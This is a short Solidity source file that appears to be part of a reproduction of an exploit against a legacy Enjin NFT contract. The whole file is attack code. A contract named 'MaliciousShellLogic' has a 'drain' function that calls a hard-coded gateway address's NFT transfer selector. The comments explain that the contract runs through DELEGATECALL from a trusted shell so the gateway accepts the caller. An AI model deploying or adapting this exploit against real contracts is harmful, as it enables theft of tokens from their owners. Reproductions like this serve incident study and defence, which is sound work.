// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// @notice Minimal "malicious shell logic" as used by the Aug-25-2026 Enjin legacy exploit
/// (mirrors the public reproduction by yinhui1984). It is registered in a Managed
/// template's `delegates` table and executed via DELEGATECALL from a per-item shell,
/// so `msg.sender` at the gateway is the shell itself (which is what the gateway trusts).
contract MaliciousShellLogic {
    address internal constant PA = 0xfaaFDc07907ff5120a76b34b731b278c38d6043C;

    /// @dev 0x41c1df0e = CryptoItemsAdapters NFT transfer gateway
    function drain(address operator, address from, address to, uint256 id) external {
        (bool ok, bytes memory ret) = PA.call(
            abi.encodeWithSelector(0x41c1df0e, operator, from, to, id)
        );
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}
